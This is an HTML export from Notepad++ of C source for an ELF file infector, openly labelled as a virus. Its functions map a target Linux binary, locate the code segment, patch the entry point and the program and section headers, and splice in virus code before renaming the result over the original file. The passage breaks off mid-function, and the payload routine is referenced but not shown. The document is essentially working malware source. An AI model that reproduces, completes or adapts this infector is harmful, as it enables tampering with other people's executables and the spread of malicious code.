<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#include "includes.h"
#include "defines.h"
#include "virus.h"
</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">open_file</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">map_file</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">is_it_ELF</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">find_segments</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">

</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">start_infection</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">patch_entry_addr</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">patch_PHDR</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">patch_SHDR</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">

</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">create_tempf</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">write_till_virus</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">close_target</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">write_virus</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc10">*);</span><span class="sc0">

</span><span class="sc1">/* ---------------------- main ------------------------ */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">argv</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc11">virus_target</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc10">!=</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">stderr</span><span class="sc10">,</span><span class="sc6">"usage : %s file_to_infect\n"</span><span class="sc10">,</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc1">/* copying target name to our global structure */</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">virus_target</span><span class="sc10">.</span><span class="sc11">src_f</span><span class="sc10">,</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
    
    </span><span class="sc1">/* opening our target ... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">open_file</span><span class="sc10">(&amp;</span><span class="sc11">virus_target</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc1">/* remember true is 1 ;) */</span><span class="sc0">
    
    </span><span class="sc1">/* maping file... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">map_file</span><span class="sc10">(&amp;</span><span class="sc11">virus_target</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* checking if ELF file... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">is_it_ELF</span><span class="sc10">(&amp;</span><span class="sc11">virus_target</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* find necessary LOAD segments */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">find_segments</span><span class="sc10">(&amp;</span><span class="sc11">virus_target</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* start with infection of target...*/</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">start_infection</span><span class="sc10">(&amp;</span><span class="sc11">virus_target</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* close file...*/</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">virus_target</span><span class="sc10">.</span><span class="sc11">fd_f</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* -------------------- is_it_ELF -------------------- */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">is_it_ELF</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* we'll check if our target is an ELF file and can be executed */</span><span class="sc0">
    </span><span class="sc1">/* therefore we'll compare the data at the beginning of the file
     * with the data of the currently runned file( CURRENT ) which is an ELF file
     * coz its being executed ;)
     * */</span><span class="sc0">
    
    </span><span class="sc1">/* we'll compare untill the address where e_entry ( entry point ) 
      beginns */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">comp_size</span><span class="sc10">=</span><span class="sc11">offsetof</span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc10">,</span><span class="sc11">e_entry</span><span class="sc10">);</span><span class="sc0">
    
        </span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Ehdr</span><span class="sc10">=</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc10">(&amp;</span><span class="sc11">Ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_ident</span><span class="sc10">,</span><span class="sc11">CURRENT</span><span class="sc10">-&gt;</span><span class="sc11">e_ident</span><span class="sc10">,</span><span class="sc11">comp_size</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">is_it_ELF</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phoff</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">CURRENT</span><span class="sc10">-&gt;</span><span class="sc11">e_phoff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">is_it_ELF</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_ehsize</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">CURRENT</span><span class="sc10">-&gt;</span><span class="sc11">e_ehsize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">is_it_ELF</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phentsize</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">CURRENT</span><span class="sc10">-&gt;</span><span class="sc11">e_phentsize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">is_it_ELF</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shentsize</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">CURRENT</span><span class="sc10">-&gt;</span><span class="sc11">e_shentsize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">is_it_ELF</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* -------------------- find_segments ----------------- */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">find_segments</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* here we'll initialize the phdr structure in our global structure: virus_target
     * we must find the offsets where those structures beginn */</span><span class="sc0">
    
    </span><span class="sc11">Elf32_Phdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Phdr</span><span class="sc10">,*</span><span class="sc11">Phdr_DATA</span><span class="sc10">,*</span><span class="sc11">Phdr_CODE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">load_segments_found</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* move to first PHDR entry : e_phoff */</span><span class="sc0">
    </span><span class="sc11">Phdr</span><span class="sc10">=</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">phdr</span><span class="sc10">=(</span><span class="sc11">Elf32_Phdr</span><span class="sc10">*)(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">byte</span><span class="sc10">+</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phoff</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">phdr_dyn</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* now we must find our code segment ... */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">--,</span><span class="sc11">Phdr</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">Phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">PT_LOAD</span><span class="sc10">:</span><span class="sc11">load_segments_found</span><span class="sc10">++;</span><span class="sc11">Phdr_DATA</span><span class="sc10">=</span><span class="sc11">Phdr</span><span class="sc10">;</span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">PT_DYNAMIC</span><span class="sc10">:</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">phdr_dyn</span><span class="sc10">=</span><span class="sc11">Phdr</span><span class="sc10">;</span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">load_segments_found</span><span class="sc10">!=</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(!(</span><span class="sc16">long</span><span class="sc10">)</span><span class="sc11">Phdr_DATA</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">phdr_code</span><span class="sc10">=</span><span class="sc11">Phdr_CODE</span><span class="sc10">=</span><span class="sc11">Phdr_DATA</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* check if code &amp; data segment are loadable... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Phdr_CODE</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc10">!=</span><span class="sc11">PT_LOAD</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">Phdr_DATA</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc10">!=</span><span class="sc11">PT_LOAD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
    
    
    </span><span class="sc1">/* first byte after the code segment... */</span><span class="sc0">
    </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">end_of_codes</span><span class="sc10">=</span><span class="sc11">Phdr_CODE</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Phdr_CODE</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">aligned_end_of_codes</span><span class="sc10">=</span><span class="sc11">ALIGN_UP</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">end_of_codes</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc9">#ifdef DEBUG_IT
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"....:::: [ find_segments ] ::::....\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"end_of_codes         = 0x%x\n"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">end_of_codes</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"aligned_end_of_codes = 0x%x\n"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">aligned_end_of_codes</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif  
</span><span class="sc0">    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
    
    

</span><span class="sc1">/* ---------------------- open_file ------------------- */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">open_file</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* try to open our target... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_f</span><span class="sc10">=</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">src_f</span><span class="sc10">,</span><span class="sc11">O_RDONLY</span><span class="sc10">))&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">open_file</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc1">/* find out file size...a good method is to seek at the end of the file */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">file_size</span><span class="sc10">=</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_f</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">SEEK_END</span><span class="sc10">))&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">open_file</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc1">/* align up the file size...needed later for inserting our virus 
     * at the right offset */</span><span class="sc0">
    </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">aligned_fsz</span><span class="sc10">=</span><span class="sc11">ALIGN_UP</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">file_size</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc9">#ifdef DEBUG_IT
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"....:::: [ open_file ] ::::....\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"src_f       = %s\n"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">src_f</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"file_size   = %d\n"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">file_size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"aligned_fsz = %d\n"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">aligned_fsz</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif  
</span><span class="sc0">    
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">    
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* ------------------- map_file -------------------- */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">map_file</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* now we're gonna map the whole file... thats quite usefull if 
     * we want to modify the file indirect ... at the end of the modifications
     * the file will be updated  with all that new modifications
     * see : man mmap  for more info */</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">start</span><span class="sc10">=</span><span class="sc11">mmap</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">file_size</span><span class="sc10">,</span><span class="sc11">PROT_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">PROT_WRITE</span><span class="sc10">,</span><span class="sc11">MAP_PRIVATE</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_f</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))==</span><span class="sc11">MAP_FAILED</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">map_file</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* ------------------ start_infection ----------------- */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">start_infection</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* we will start here with our patching procedures etc. */</span><span class="sc0">
    
    </span><span class="sc1">/* first of all we must patch the entry point address : Ehdr-&gt;e_entry */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">patch_entry_addr</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* patching Program Header(PHDR) */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">patch_PHDR</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* patching Sections Header(SHDR) */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">patch_SHDR</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* create temp file...*/</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">create_tempf</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* beginn writting process... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">write_till_virus</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* rename temp file to original file name*/</span><span class="sc0">
    </span><span class="sc11">rename</span><span class="sc10">(</span><span class="sc11">TEMP_FILE</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">src_f</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc1">/* unmap target ... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">close_target</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* ----------------- close_target ------------------- */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">close_target</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">start</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">file_size</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc1">/* closing both file descriptors... */</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_f</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_dest</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* ---------------- write_till_virus ---------------- */</span><span class="sc0">
</span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">write_till_virus</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* writting until the end of the code segment where
     * we'll gonna insert our virus... */</span><span class="sc0">
    
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_dest</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">mmap</span><span class="sc10">.</span><span class="sc11">start</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">end_of_codes</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc1">/* seeking to the aligned address where we must insert our virus
     code */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_dest</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">aligned_end_of_codes</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">write_till_virus</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc1">/* write our virus code ... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">write_virus</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* seek after the virus code to insert the rest of file... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_dest</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">end_of_codes</span><span class="sc10">+</span><span class="sc11">ELF_PAGE_SZ</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">write_till_virus</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc1">/* copying rest of file...*/</span><span class="sc0">
